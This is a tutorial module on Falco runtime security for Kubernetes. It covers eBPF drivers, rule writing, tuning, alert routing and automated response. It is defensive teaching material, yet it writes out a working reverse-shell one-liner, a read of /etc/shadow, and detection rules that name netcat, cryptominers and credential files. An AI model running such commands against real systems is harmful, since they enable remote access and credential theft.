---
revision_pending: false
title: "Module 4.3: Falco & Runtime Security"
slug: platform/toolkits/security-quality/security-tools/module-4.3-falco
sidebar:
  order: 4
---
> **Toolkit Track** | Complexity: `[COMPLEX]` | Time: 50-60 minutes
>
> **Prerequisites**: [Security Principles Foundations](/platform/foundations/security-principles/), Linux basics (processes, files, networking), Kubernetes networking concepts

## What You'll Be Able to Do

After completing this module, you will be able to:

- **Deploy Falco with the modern eBPF driver for runtime security monitoring of Kubernetes workloads**
- **Configure custom Falco rules to detect suspicious container behavior, including shell access, file modifications, and unexpected network connections**
- **Implement Falco alert routing through Falcosidekick to Slack, PagerDuty, Prometheus, and SIEM systems for security incident response**
- **Tune Falco rules to reduce false positives while maintaining detection coverage, using exceptions, macros, and pod labels**
- **Understand the distinction between runtime detection (Falco) and in-kernel enforcement (Tetragon, KubeArmor) to choose the right tool for each security layer**

## Why This Module Matters

Every cloud-native security pipeline eventually reaches the same uncomfortable conclusion: prevention is necessary but insufficient. You can scan every image for known vulnerabilities with Trivy. You can enforce policies at the admission gate with Kyverno or Gatekeeper. You can sign every container image with Cosign and verify those signatures before deployment. And still, a container running in your production cluster can be compromised by an attack that none of those controls could have stopped.

Consider what happens when a zero-day vulnerability in a widely-used library is disclosed on a Tuesday morning. Your image scanners do not know about it yet because the CVE has not been published. Your admission policies approved the deployment last Friday because the image passed every check. The container is already running, serving traffic, and the only thing standing between you and a breach is the actual behavior of the processes inside that container. This is the gap that runtime security exists to close.

Runtime detection does not ask "does this container image contain known vulnerabilities?" It asks "is this container doing something it should not be doing right now?" The distinction is fundamental. Build-time and deploy-time security validate intent — what the image claims it will do, what the manifest declares, what the policy permits. Runtime security observes reality — what the processes actually execute, what files they actually open, what network connections they actually establish. When intention and reality diverge, that divergence is a security signal.

> **Hypothetical scenario:** A platform team deploys a web application behind standard controls: image scanning, admission webhooks, network policies, and read-only root filesystems. Three months later, CPU utilization on the web pods begins climbing gradually — not a spike, just a slow and steady increase from 15% to roughly 40% over two weeks. The monitoring dashboard attributes it to organic traffic growth. What is actually happening: an attacker exploited a deserialization vulnerability in a logging library six weeks after the container was deployed, gained a foothold, and is now running a cryptocurrency miner under a process named `httpd-gc` that blends into the normal process tree. No image scanner would have flagged this because the vulnerability was unknown at build time. No admission controller would have blocked it because the pod was admitted months ago. Only runtime behavioral monitoring — watching for unexpected process execution, unusual outbound connections, or anomalies against a known profile — could have surfaced the intrusion before it ran for weeks undetected.

## How Runtime Detection Captures Events

Runtime detection systems operate by observing events at the boundary between userspace and the kernel. Every meaningful action a container performs — spawning a process, opening a file, establishing a network connection, mounting a filesystem — must transit through a system call. The kernel sees everything, and if you can instrument the kernel to report on those system calls, you can build a complete picture of container behavior at runtime.

### System Calls as the Foundation

A system call is the mechanism by which a userspace program requests a service from the operating system kernel. When a containerized process runs `cat /etc/shadow`, it does not directly read bytes from a disk. It calls the `openat()` system call to obtain a file descriptor, then calls `read()` to pull data through that descriptor. When an attacker spawns a reverse shell with `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, the kernel sees an `execve()` call launching bash, followed by `socket()` and `connect()` system calls establishing an outbound TCP connection. These are observable events, and they form the raw material from which runtime detection rules are built.

The power of syscall-based monitoring is that it is semantically rich and impossible for a userspace process to evade. A process can rename itself, hide from `/proc`, or masquerade as a legitimate binary, but it cannot avoid making system calls to do useful work. The kernel is the ultimate source of truth about what is happening on a system, and instrumenting the kernel at the syscall layer provides an unspoofable audit trail of every significant action.

However, the raw syscall stream is also extraordinarily noisy. A single `kubectl exec` into a container to run `ls` can generate dozens of system calls. A busy production workload might generate hundreds of thousands per second. Worse, the vast majority of these syscalls are entirely benign — reading configuration files, writing log lines, accepting incoming HTTP connections on the expected port. The challenge of runtime detection is not capturing the data — it is filtering the signal from the noise, and doing so with minimal performance overhead. If the instrumentation is too heavy, it becomes the bottleneck that the security team is blamed for. If it is too light, it misses the attacker's subtle movements. This filtering problem is what makes Falco's rules engine, with its composable macros, lists, and priority levels, the critical middle layer of the architecture rather than an afterthought bolted onto a syscall dump.

### The Instrumentation Layer: Drivers

Falco captures system calls through a kernel instrumentation layer called a driver. The driver sits between the kernel's syscall dispatch path and the Falco userspace engine, capturing relevant events and passing them up for evaluation against rules. There are two driver architectures available, and the choice between them has meaningful tradeoffs for deployability, safety, and performance.

**Kernel Module.** The original Falco driver, implemented as a traditional Linux kernel module (`*.ko`). It compiles against the specific kernel headers of the target host and inserts itself into the kernel's syscall handling path. The kernel module is the most mature driver and works on kernels as old as 3.10 on x86_64, which makes it the only option for very old or highly-customized Linux distributions. The tradeoff is operational complexity: the module must be compiled for each kernel version, requires full kernel headers to be available on the host, and runs with full kernel privileges. On managed Kubernetes services that restrict kernel module loading — such as GKE Autopilot or EKS Fargate — the kernel module is simply not an option. The module also represents a larger attack surface: a bug in the driver can crash the entire node, not just the Falco process.

**Modern eBPF Probe.** The recommended driver for contemporary deployments, introduced as a first-class option in Falco 0.35 and built on the CO-RE (Compile Once, Run Everywhere) paradigm. The modern eBPF probe compiles its instrumentation logic once at build time into a portable eBPF object that can be loaded on any kernel supporting the required eBPF features — principally the BPF ring buffer and BTF (BPF Type Format) type information. These features are available by default in kernel 5.8 and later, though many distributions have backported them to older kernels. The transformative advantage of CO-RE is that the probe does not need kernel headers, does not compile anything at load time, and is embedded directly into the Falco userspace binary. When you deploy Falco with `driver.kind=modern_ebpf`, the probe loads automatically if the kernel supports it, with no external dependencies. The modern eBPF probe also runs with a minimal set of Linux capabilities — `CAP_SYS_ADMIN`, `CAP_BPF`, `CAP_PERFMON`, and `CAP_NET_RAW` — rather than requiring full root equivalence. This substantially reduces the blast radius of a potential vulnerability in the driver itself.

There is also a legacy eBPF probe (sometimes called the "classic" eBPF driver) that predates CO-RE and requires kernel headers for compilation. It is still supported but is being superseded by the modern eBPF probe and should only be used when the kernel module is unavailable and the modern probe's kernel requirements are not met. For most greenfield deployments on Kubernetes, the modern eBPF probe is the correct starting point.

## Falco Architecture

Falco's architecture follows a clean pipeline: events flow from the kernel through a driver into a userspace engine that evaluates them against a rule set, and matching events are emitted through configurable output channels. Understanding this pipeline is essential for operating Falco effectively, because each stage has its own failure modes, performance characteristics, and tuning knobs.

```
FALCO ARCHITECTURE
════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────┐
│                         NODE                                     │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                    LINUX KERNEL                          │   │
│  │                                                          │   │
│  │   Process A ──┐                                          │   │
│  │   Process B ──┼──▶ System Calls ──▶ eBPF Probe          │   │
│  │   Process C ──┘    (open, exec,     (captures all)       │   │
│  │                     connect...)                          │   │
│  └───────────────────────────────────┬─────────────────────┘   │
│                                      │                          │
│                                      ▼                          │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                        FALCO                               │ │
│  │                                                            │ │
│  │  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐   │ │
│  │  │   Driver    │───▶│   Engine    │───▶│   Outputs   │   │ │
│  │  │ (eBPF/kmod) │    │  (rules)    │    │ (alerts)    │   │ │
│  │  └─────────────┘    └─────────────┘    └─────────────┘   │ │
│  │                                              │             │ │
│  │                                              ▼             │ │
│  │                          ┌───────────────────────────────┐│ │
│  │                          │ stdout, syslog, webhook,      ││ │
│  │                          │ Slack, PagerDuty, Kafka...    ││ │
│  │                          └───────────────────────────────┘│ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

The driver is the first stage. On each node in your cluster, a Falco pod (typically deployed as a DaemonSet) attaches the driver to the kernel and begins receiving a filtered stream of system call events. The filtering happens in the kernel before events reach userspace, which is critical for performance — Falco instructs the eBPF probe to only capture events relevant to the rules that are loaded, rather than streaming every syscall on the system into userspace for evaluation.

The engine is the second stage. Event records arrive from the driver and are evaluated against the loaded rule set. Falco's rule engine is built on top of libsinsp, the same system inspection library that powers Sysdig, and it enriches raw syscall events with context: the container ID, the Kubernetes pod name and namespace, the process ancestry tree, and the user identity. This enrichment is what transforms a raw event like "PID 14235 called execve()" into an actionable alert like "Shell spawned in container nginx, pod nginx-5d4c7b8f-abc12, namespace production, by user root."

The outputs stage is the third and final stage. When a rule evaluates to true, the engine constructs an alert message from the rule's output template and passes it to the configured output channels. The simplest configuration writes alerts to stdout (which becomes a Kubernetes log line), but Falco also supports direct output to syslog, file, program pipes, and HTTP webhooks. In practice, most production deployments route through Falcosidekick, a companion daemon that multiplexes alerts to dozens of downstream systems.

### Installation Patterns

Falco is most commonly deployed on Kubernetes as a DaemonSet using the official Helm chart. The DaemonSet ensures one Falco pod per node, which gives each Falco instance a direct view of the kernel events on its host. The Helm chart handles driver selection, rule file mounting, and Falcosidekick integration through a single values file.

```bash
# Add Falco Helm repo
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install with modern eBPF driver (recommended)
helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set driver.kind=modern_ebpf

# Verify
kubectl get pods -n falco
kubectl logs -n falco -l app.kubernetes.io/name=falco
```

Falco can also run as a standalone binary on Linux hosts (installed via DEB or RPM packages), as a Docker container with the host's kernel instrumented from the outside, or managed through the Falco Operator which provides a Kubernetes-native custom resource for declarative configuration. The Helm chart remains the most common path for Kubernetes-native deployments because it handles the full lifecycle — DaemonSet, RBAC, ConfigMaps for rules, and sidecar integration — in a single install command. When configuring the chart, the two decisions that most affect your operational experience are the driver selection (`driver.kind`) and the Falcosidekick enablement. Choosing `modern_ebpf` eliminates the ongoing maintenance burden of kernel header management; enabling Falcosidekick is what transforms Falco from a log-producing DaemonSet into an actionable security detection pipeline.

## The Falco Rules Engine

Falco rules are the bridge between raw kernel events and actionable security alerts. A rule is a YAML document that declares: "when you observe these conditions in the event stream, emit this output at this priority." The power of the rules engine comes from its composability — rules are built from reusable macros and lists, which encourages a layered approach to detection logic where common filtering conditions are defined once and shared across many rules.

### Rule Anatomy

Every Falco rule contains a required set of fields: `rule` (the name), `desc` (a human-readable description), `condition` (a boolean expression evaluated against each event), `output` (a template string rendered when the rule fires), and `priority` (one of EMERGENCY, ALERT, CRITICAL, ERROR, WARNING, NOTICE, INFORMATIONAL, or DEBUG). Optional fields include `enabled` (to disable a rule without deleting it), `tags` (for categorization, conventionally including MITRE ATT&CK technique IDs), and `exceptions` (structured conditions that suppress the rule in known-benign circumstances).

The condition field uses a domain-specific filtering language that references event fields, macros, and lists. Event fields are drawn from the syscall event itself — `evt.type` for the system call name, `proc.name` for the process executable, `fd.name` for file descriptor paths, `fd.sip` and `fd.sport` for network connection endpoints — as well as from the enrichment layer that Falco applies: `container.id`, `container.image.repository`, `k8s.ns.name`, `k8s.pod.name`, `user.name`, and dozens of others.

```yaml
# A Falco rule has these components:

- rule: Shell Spawned in Container
  desc: Detect shell execution in a container
  condition: >
    spawned_process and
    container and
    shell_procs
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name
     shell=%proc.name parent=%proc.pname
     cmdline=%proc.cmdline)
  priority: WARNING
  tags: [container, shell, mitre_execution]
```

### Macros and Lists: Composable Detection Logic

Writing every rule with fully inline conditions would be repetitive and error-prone. Macros encapsulate commonly-used condition fragments into named, reusable components. A macro like `spawned_process` expands to `evt.type = execve and evt.dir = <`, capturing the core event that signals a new process. Another macro like `container` expands to `container.id != host`, ensuring the rule only fires for processes inside containers rather than on the host node itself. By composing macros, a rule author can express complex detection logic as a readable chain of named predicates.

Lists serve a complementary role: they define collections of values that are referenced in conditions. A list of shell binaries (`bash, sh, zsh, ksh`) can be checked with `proc.name in (shell_binaries)`. A list of sensitive file paths (`/etc/shadow, /etc/passwd, /etc/sudoers`) can be checked with `fd.name in (sensitive_files)`. Lists make rules self-documenting — the intent of the list is clear from its name — and they centralize value management so that adding a new shell binary to the list updates every rule that references it.

```yaml
# Macros - reusable condition fragments
- macro: container
  condition: container.id != host

- macro: shell_procs
  condition: proc.name in (bash, sh, zsh, ksh, csh, dash)

- macro: spawned_process
  condition: evt.type = execve and evt.dir = <

# Lists - reusable value sets
- list: sensitive_files
  items: [/etc/shadow, /etc/passwd, /etc/sudoers]

- list: package_mgmt_binaries
  items: [apt, apt-get, yum, dnf, apk, pip, npm]
```

### Priority Levels and Alert Triage

Falco assigns every alert a priority from the standard syslog severity scale, and using these priorities correctly is the first line of defense against alert fatigue. CRITICAL should be reserved for events that indicate a probable active compromise: reverse shells, cryptominer execution, container escape attempts, or writes to sensitive system paths by unexpected processes. WARNING is appropriate for behavior that is suspicious but not definitively malicious: a shell spawning in a production container, a package manager being invoked, or an outbound connection to an unrecognized destination. NOTICE and INFORMATIONAL are useful during the tuning phase to understand baseline behavior, but in production these lower-priority alerts should typically be routed to a log aggregation system rather than to an on-call pager.

The priority level also controls routing behavior in Falcosidekick. A common configuration sends CRITICAL alerts to PagerDuty for immediate response, WARNING alerts to Slack for triage during business hours, and everything else to Loki or Elasticsearch for forensic analysis. This tiered routing ensures that the security team's attention is directed at the highest-signal events while still preserving a complete audit trail for incident investigation.

### Core Detection Rules

Falco ships with a default rule set maintained by the community that covers the most common cloud-native attack patterns. These rules embody years of operational security experience and provide a strong starting point for any deployment. Understanding what each rule detects and why it matters is essential before you begin tuning or writing custom rules.

**Shell in Container.** The most fundamental runtime detection rule. Spawning an interactive shell inside a running production container is rarely legitimate — it typically means a human operator is debugging (acceptable if governed by policy) or an attacker has gained code execution and is exploring the environment (an active incident). The default rule fires on any `execve` of a shell binary inside a container context. This rule alone accounts for the majority of false positives in most deployments because `kubectl exec` for legitimate debugging is both common and indistinguishable at the syscall level from an attacker's reconnaissance shell. Tuning this rule well — using pod labels, namespace exceptions, and time-based windows — is the single most impactful operational decision you will make when deploying Falco.

**Unexpected Outbound Connection.** Containers generally have a narrow and predictable set of network destinations: their database, their cache, their upstream API, and perhaps an observability backend. A connection to an arbitrary IP address on a non-standard port is a strong indicator of command-and-control traffic, data exfiltration, or cryptomining pool communication. The default rule fires on outbound connections from containers where the destination is not in a defined allowlist. Maintaining this allowlist accurately — keeping it tight enough to detect anomalies but loose enough to avoid drowning in false positives — is a continuous operational discipline that requires coordination between the security team and the service owners who understand each workload's legitimate network dependencies.

**Write to Sensitive Mount.** Containers should not write to `/etc`, `/bin`, `/usr`, or other system directories — their filesystems should be immutable except for specific data volumes. A write to `/etc/passwd`, `/etc/shadow`, or `/etc/crontab` inside a container is a near-certain indicator of attacker persistence activity.

**Privilege Escalation Attempt.** Any attempt by a containerized process to change its user ID to root via `setuid()`, to manipulate Linux capabilities, or to mount the host filesystem from within a container is an immediate red flag. The default rule set includes multiple privilege escalation signatures keyed to the MITRE ATT&CK Privilege Escalation tactic.

```yaml
# 1. Cryptominer Detection
- rule: Detect Cryptominer
  desc: Detect cryptocurrency mining activity
  condition: >
    spawned_process and
    (proc.name in (xmrig, minerd, cpuminer) or
     proc.cmdline contains "stratum+tcp" or
     proc.cmdline contains "mining" or
     proc.cmdline contains "--coin")
  output: >
    Cryptominer detected
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: CRITICAL
  tags: [cryptomining, mitre_impact]

# 2. Reverse Shell Detection
- rule: Reverse Shell
  desc: Detect reverse shell connections
  condition: >
    spawned_process and
    proc.name in (bash, sh, nc, ncat) and
    fd.type = ipv4 and
    fd.direction = out
  output: >
    Reverse shell detected
    (user=%user.name command=%proc.cmdline connection=%fd.name)
  priority: CRITICAL
  tags: [network, mitre_execution]

# 3. Sensitive File Access
- rule: Read Sensitive File
  desc: Detect read of sensitive files
  condition: >
    open_read and
    fd.name in (sensitive_files) and
    not trusted_process
  output: >
    Sensitive file read
    (user=%user.name file=%fd.name process=%proc.name)
  priority: WARNING
  tags: [filesystem, mitre_credential_access]

# 4. Package Manager in Container
- rule: Package Manager Execution in Container
  desc: Package managers should not run in containers
  condition: >
    spawned_process and
    container and
    proc.name in (apt, apt-get, yum, dnf, apk, pip)
  output: >
    Package manager run in container
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: ERROR
  tags: [container, mitre_persistence]

# 5. Container Escape Attempt
- rule: Container Escape via Mount
  desc: Detect attempt to mount host filesystem
  condition: >
    evt.type = mount and
    container and
    not allowed_mount
  output: >
    Mount attempt in container (possible escape)
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]
```

## Rule Tuning: The Real Operational Work

Deploying Falco with the default rules on a production cluster will, within minutes, generate alerts. This is not a sign that Falco is broken or that your cluster is compromised — it is a sign that real-world workloads are complex and the default rules are deliberately broad. The operational work of running Falco is rule tuning: reducing false positives to a manageable level without creating blind spots that an attacker could exploit.

### The Tuning Lifecycle

The tuning process follows a predictable lifecycle. You deploy the default rules in a staging or non-critical environment. You observe which rules fire most frequently and which ones map to known-legitimate behavior. For each noisy rule, you determine whether the underlying behavior is expected — an init container that installs packages, a debug sidecar that spawns shells, a backup agent that reads sensitive files — and you encode that expectation into the rule as an exception. You redeploy and observe again, iterating until the alert volume in a normal operational day is low enough that a human can investigate every WARNING and CRITICAL alert. At that point, the rule set is ready for production.

Tuning is not a one-time activity. Every new workload, every new version of a third-party container image, and every change to operational procedures can introduce new legitimate behaviors that trip existing rules. Teams that treat Falco tuning as a set-and-forget task invariably drift into one of two failure modes: either they disable so many rules that the deployment becomes a placebo, or they tolerate alert fatigue so severe that real incidents are drowned in noise.

```
RULE LIFECYCLE
════════════════════════════════════════════════════════════════════

Initial Deploy ──▶ Observe Noise ──▶ Add Exceptions ──▶ Validate Coverage ──▶ Production
                                              ▲                           │
                                              └─────── Iterate ──────────┘
```

### Exception Strategies

Falco provides multiple mechanisms for adding exceptions to rules, and choosing the right mechanism for each false positive is important for maintainability. The three most common approaches are macro exceptions, list exceptions, and pod-label gating.

Macro exceptions are the most flexible approach. You define a macro that captures the condition under which a specific behavior is expected — for example, "shell processes spawned from containers running the debug-tools image" or "package managers invoked within pods labeled `builder=true`." You then add `and not <macro-name>` to the rule's condition. The advantage of macro exceptions is that they are self-documenting: the macro name explains why the exception exists. The disadvantage is that they add complexity to the rule's condition, and a single poorly-specified macro can suppress the rule for a much broader set of events than intended.

List exceptions are appropriate when the exception is a closed set of known-safe values. If a small number of container images legitimately run shell processes, you can maintain a list of those images and check `not container.image.repository in (allowed_shell_images)`. Lists are easy to audit because all the values are in one place, but they require manual updates whenever a new allowlisted workload is added.

Pod-label gating is the most operationally elegant approach for Kubernetes deployments. Instead of maintaining allowlists in Falco's configuration, you encode the security posture of each workload in its Kubernetes labels. A pod that is authorized to spawn shells carries the label `shell-allowed: "true"`. The Falco rule checks `not k8s.pod.label.shell-allowed = "true"`. This approach decouples Falco configuration from workload management — the platform team controlling the pod spec decides which workloads are authorized for special access, and Falco automatically respects those decisions.

```yaml
# Method 1: Macro exceptions
- macro: trusted_shell_process
  condition: >
    (container.image.repository = "gcr.io/my-project/debug-tools") or
    (k8s.pod.name startswith "maintenance-")

- rule: Shell Spawned in Container
  condition: >
    spawned_process and
    container and
    shell_procs and
    not trusted_shell_process
  # ... rest of rule

# Method 2: List exceptions
- list: allowed_package_manager_images
  items: [
    gcr.io/my-project/builder,
    docker.io/library/python
  ]

- rule: Package Manager Execution in Container
  condition: >
    spawned_process and
    container and
    proc.name in (apt, apt-get, yum, dnf, apk, pip) and
    not container.image.repository in (allowed_package_manager_images)

# Method 3: Pod-label gating
- rule: Unexpected Shell in Container
  desc: Shell in production container (excluding labeled pods)
  condition: >
    spawned_process and
    container and
    shell_procs and
    not k8s.ns.name = "debug" and
    not k8s.pod.label.shell-allowed = "true"
  output: >
    Shell spawned (user=%user.name container=%container.name
    namespace=%k8s.ns.name pod=%k8s.pod.name)
  priority: WARNING
```

### Custom Rules Files on Kubernetes

When deploying Falco via Helm, custom rules are supplied as a values file that inlines YAML rule definitions. This approach keeps your detection logic in version control alongside your infrastructure configuration, which makes it auditable and reproducible. The custom rules file can both add new rules and override or disable existing default rules.

```yaml
# custom-rules.yaml
customRules:
  my-rules.yaml: |-
    # Override default rule
    - rule: Terminal Shell in Container
      enabled: false

    # Add our tuned version
    - rule: Unexpected Shell in Container
      desc: Shell in production container (excluding debug pods)
      condition: >
        spawned_process and
        container and
        shell_procs and
        not k8s.ns.name = "debug" and
        not k8s.pod.label.shell-allowed = "true"
      output: >
        Shell spawned (user=%user.name container=%container.name
        namespace=%k8s.ns.name pod=%k8s.pod.name)
      priority: WARNING
```

```bash
# Deploy with custom rules
helm upgrade falco falcosecurity/falco \
  --namespace falco \
  -f custom-rules.yaml
```

## Alert Routing with Falcosidekick

Falco itself emits alerts to stdout by default. While this is sufficient for development and ad-hoc testing — `kubectl logs` on the Falco pod shows you what is happening — a production deployment needs alerts to reach the right people through the right channels at the right urgency. Falcosidekick is the routing layer that sits between Falco's output and the broader observability and incident response ecosystem.

### Architecture and Multichannel Routing

Falcosidekick runs as a separate process (typically a sidecar container in the Falco DaemonSet pod or a standalone deployment) that receives alerts from Falco over HTTP or gRPC. On receiving an alert, it evaluates the alert's priority and, based on its configuration, forwards the alert to one or more downstream outputs. A single alert can be routed to multiple outputs simultaneously — a CRITICAL cryptominer detection might go to PagerDuty for immediate paging, to Slack for team visibility, to Prometheus as a metric for dashboarding, and to an S3 bucket for long-term retention, all from one event.

```
FALCOSIDEKICK ARCHITECTURE
════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────┐
│                                                                  │
│  Falco ──▶ Falcosidekick ──┬──▶ Slack                          │
│            (router)        ├──▶ PagerDuty                       │
│                           ├──▶ Prometheus Alertmanager          │
│                           ├──▶ Elasticsearch                    │
│                           ├──▶ Loki                             │
│                           ├──▶ AWS Lambda / S3                  │
│                           ├──▶ Kafka / NATS                     │
│                           ├──▶ Webhook (custom endpoint)        │
│                           └──▶ Falco Talon (response actions)   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

The configuration model is straightforward: each output has its own configuration block within the Falcosidekick config, and each block can specify a `minimumpriority` threshold. Alerts below the threshold are silently dropped for that output, which allows you to route CRITICAL and EMERGENCY events to PagerDuty while sending WARNING and above to Slack, without duplicating the alerting logic.

```yaml
# Falcosidekick config
falcosidekick:
  enabled: true
  config:
    slack:
      webhookurl: "https://hooks.slack.com/services/XXX/YYY/ZZZ"
      minimumpriority: "warning"
      messageformat: "fields"

    pagerduty:
      apikey: "your-api-key"
      minimumpriority: "critical"

    prometheus:
      enabled: true

    loki:
      hostport: "http://loki.monitoring:3100"
      minimumpriority: "debug"
```

### Kubernetes-Native Response with Falco Talon

Detection is only half of the security equation. Once Falco identifies a suspicious event, what happens next? For many teams, the initial response is manual: an on-call engineer receives the PagerDuty alert, investigates the context, and decides whether to isolate the pod, capture a memory dump, or escalate. But manual response has latency measured in minutes, and in an active compromise, minutes matter.

Falco Talon is the response-action companion to Falco. It subscribes to Falco alerts (typically through Falcosidekick) and executes pre-configured response actions based on the alert's rule, priority, and Kubernetes context. Common response actions include: immediately deleting the pod (triggering a restart from a known-good image), cordoning the node, capturing a forensic snapshot (process list, network connections, filesystem diff), or applying a network policy that isolates the pod from all traffic. Talon actions are configured as YAML rules that map Falco rule names to response actions with configurable parameters.

The decision to automate response actions is a tradeoff between response speed and blast radius. Automatically deleting a pod on a CRITICAL alert stops an active attack within seconds, but if the alert is a false positive — a legitimate but unusual operation that happened to match a detection rule — you have just disrupted a production service unnecessarily. Teams typically start with alert-only mode, build confidence in their rule tuning over weeks or months, and then gradually introduce automated response for the highest-confidence, lowest-false-positive rules. A pragmatic intermediate step is to configure Talon to execute non-destructive actions — capturing forensic snapshots, applying network isolation policies, or creating an incident ticket — while still requiring human approval for destructive actions like pod deletion. This preserves the speed advantage of automation for evidence collection while keeping the blast-radius safety net of human judgment for service-affecting decisions.

## Patterns and Anti-Patterns

### Patterns

**Layered exception strategy.** Use pod labels as the primary gating mechanism for Kubernetes-aware rules, lists for closed sets of known-safe values (like internal tool images), and macros for complex conditional exceptions that combine multiple fields. This hierarchy keeps the most operationally dynamic decisions — which pods are authorized for special access — in the pod spec rather than in the Falco configuration, where platform teams already manage them.

**Tune in staging, monitor in production.** Run the full default rule set in a staging cluster that mirrors production workload patterns. Spend at least a week observing alerts, adding exceptions for every legitimate behavior, and confirming that no real attacks would have been missed. Only then promote the tuned rule set to production. This staging soak period is the single highest-return investment you can make in Falco effectiveness.

**Baseline before alerting.** When deploying Falco to a cluster for the first time, run it in a mode where all alerts are routed only to a log store (Loki, Elasticsearch) and not to any paging system. After a full business cycle, analyze the alert volume per rule, per namespace, and per priority. Use this baseline to set realistic expectations for what "normal" looks like and to calibrate your tuning before anyone's pager is involved.

**Correlate with Kubernetes audit logs.** Syscall monitoring tells you what a process did; Kubernetes audit logs tell you who requested it. When Falco detects a suspicious pod operation, cross-referencing the Kubernetes audit log for the same time window reveals whether the pod was created by a CI/CD pipeline, a human operator, or a compromised service account. The Kubernetes audit plugin for Falco connects these two data sources within the rules engine, enabling rules that check both syscall behavior and the API server audit trail.

### Anti-Patterns

**Default rules straight to production with PagerDuty.** This is the most common and most damaging mistake. The default rule set is intentionally broad — it is designed to catch as many potential threats as possible across diverse environments. Deploying it to production without tuning will generate hundreds or thousands of alerts per day, most of them false positives, and within a week the security team will have trained themselves to ignore Falco alerts entirely. Alert fatigue is not a Falco problem; it is a tuning problem.

**Disabling rules instead of adding exceptions.** When a rule is noisy, the temptation is to set `enabled: false` and move on. This eliminates the noise but also eliminates the detection. For example, disabling the "Shell in Container" rule because your debug sidecars trigger it means you will also miss an attacker spawning a shell in a production web container. Always prefer exceptions — whether macro, list, or label-based — that suppress the rule for specific, known-safe contexts while preserving it for everything else.

**Using kernel module on managed Kubernetes.** On EKS, AKS, and especially GKE Autopilot, kernel module loading is either restricted or impossible. Attempting to deploy Falco with `driver.kind=module` on these platforms results in CrashLoopBackOff pods and no runtime detection at all. Always verify driver compatibility against your node's kernel version and the platform's security constraints before deploying. The modern eBPF probe is compatible with all major managed Kubernetes services as of kernel 5.8+.

**Ignoring dropped events.** Falco's event processing pipeline has finite capacity, and under extreme load — a fork bomb, a noisy neighbor, or simply a very busy node — events can be dropped. Falco reports dropped event counts in its own metrics and logs. A rising dropped-event rate means the detection system is going blind, and no amount of rule tuning will compensate for events that never reach the engine. Monitor dropped events as a first-class health signal.

## Decision Framework: Runtime Security Tools Compared

**Landscape snapshot — as of 2026-06. This changes fast; verify against vendor docs before relying on specifics.**

Falco is not the only runtime security tool in the cloud-native ecosystem, and understanding where it fits relative to its peers is essential for making sound architectural decisions. The following Rosetta table compares four tools across the durable capabilities that define the runtime security space. The goal is not to declare one tool superior — each tool occupies a different point in the design space, optimized for a different security posture — but to give you a framework for evaluating which tool or combination of tools is appropriate for your specific threat model and operational constraints.

| Capability | Falco | Tetragon | KubeArmor | Sysdig Secure |
|---|---|---|---|---|
| **Primary angle** | Detection-first: alert on suspicious behavior | eBPF observability + in-kernel enforcement | LSM-based policy enforcement | Full-stack: detection + forensics + compliance |
| **Data source** | Syscalls (kmod / modern eBPF probe), k8s audit via plugins | eBPF hooks (kprobes, tracepoints) directly, no separate driver | Linux Security Modules (LSM): AppArmor, SELinux, BPF-LSM | Syscalls + network capture (eBPF probe) |
| **Rules language** | YAML-based: macros, lists, condition expressions | CEL-based TracingPolicy CRDs (Kubernetes-native) | YAML-based policy CRDs defining allowed process/file/network operations | Lua-based detection rules + policy language |
| **K8s-audit integration** | Built-in via k8saudit plugin (events + rules) | Not a primary focus; relies on Falco for audit log monitoring | N/A (enforcement, not detection) | Supported through Sysdig agent |
| **Response model** | External: Falcosidekick routes alerts to SIEM, SOAR, Falco Talon for actions | In-kernel: can block syscalls directly from eBPF programs | In-kernel: enforces per-pod LSM profiles | Integrated: Sysdig agent can kill, pause, or snapshot containers |
| **CNCF status** | Graduated (February 2024) | Cilium sub-project (Cilium is Graduated; Tetragon not separately rated) | Sandbox | Vendor (not CNCF) |
| **Operational maturity** | High: large community, default rule set, extensive docs | Moderate: rapidly evolving, strong eBPF integration | Moderate: good for LSM enforcement, narrower scope | High: enterprise support, commercial backing |

The key architectural distinction is between detection-oriented tools (Falco) and enforcement-oriented tools (Tetragon, KubeArmor). Falco tells you when something suspicious happens; Tetragon and KubeArmor can actively prevent it from happening by blocking the offending system call or enforcing an LSM policy at the kernel level. This distinction is not competitive — it is complementary. A mature runtime security posture typically layers detection (Falco) for broad visibility and alerting with enforcement (Tetragon or KubeArmor) for high-confidence blocking of known-bad behaviors, much as a network security architecture layers IDS (detection) with firewall rules (enforcement).

The choice between Tetragon and KubeArmor for the enforcement layer depends on your primitives. Tetragon operates at the eBPF hook level, which gives it broad visibility across the kernel but means its enforcement model is tied to what eBPF programs can express. KubeArmor operates at the LSM level, which gives it access to the kernel's existing mandatory access control framework. If your organization already has expertise with AppArmor or SELinux profiles, KubeArmor provides a natural extension of those concepts to Kubernetes-native pod security. For a deeper treatment of in-kernel enforcement with eBPF and the Tetragon approach, see Module 4.5.

## Did You Know?

- **Falco's name comes from Latin.** The project is named after the genus of falcons — birds of prey known for their exceptional vision and ability to detect movement from great distances. The analogy is deliberate: Falco sits at a high vantage point (the kernel), observes everything that moves (system calls), and alerts when it spots threatening behavior. The project's mascot, a stylized falcon in teal, appears across the documentation and community materials.
- **The default rule set maps to MITRE ATT&CK.** Every default Falco rule includes MITRE ATT&CK tags that map the detected behavior to the corresponding adversary tactic and technique. A rule detecting a reverse shell carries `mitre_execution` (TA0002, T1059: Command and Scripting Interpreter). A rule detecting a privilege escalation attempt carries `mitre_privilege_escalation` (TA0004). This mapping means that Falco alerts integrate naturally into threat-hunting workflows organized around the MITRE framework, and it helps SOC analysts understand not just what happened but what the attacker was likely trying to accomplish next.
